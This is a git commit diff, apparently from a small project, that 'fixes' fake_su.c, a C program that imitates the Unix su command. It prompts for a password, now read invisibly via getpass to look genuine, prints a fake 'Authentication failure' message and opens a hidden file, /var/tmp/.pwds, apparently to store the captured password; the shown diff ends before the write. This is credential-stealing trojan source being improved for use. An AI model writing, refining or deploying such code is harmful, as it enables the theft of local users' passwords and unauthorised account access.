b283662c15a0714e775d1dd57f48a2c678efd9a6
lagoon0o0 <lagoonzxy@gmail.com>
2016-12-18 17:59:39 +0800

    fake_su fixed

--- src/fake_su.c
+++ src/fake_su.c
@@ -1,11 +1,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h> 
+#include <unistd.h>
 
 int main(int argc, char *argv[]){
 
     FILE *fp;
-    char *user, *pass;
+    char *user;
+    char *pass;
     char filex[100], clean[100];
 
     sprintf(filex,"/var/tmp/.pwds");
@@ -14,7 +16,7 @@ int main(int argc, char *argv[]){
     if (argc == 2)  user = argv[1];
     if (argc > 2)   user = argv[argc - 1];
     fprintf(stdout, "Password: ");
-    scanf("%s", pass);
+    pass = getpass("");    
     system("sleep 2");
     fprintf(stdout, "su: Authentication failure\nSorry.\n");
     if ((fp = fopen(filex, "w")) != NULL){
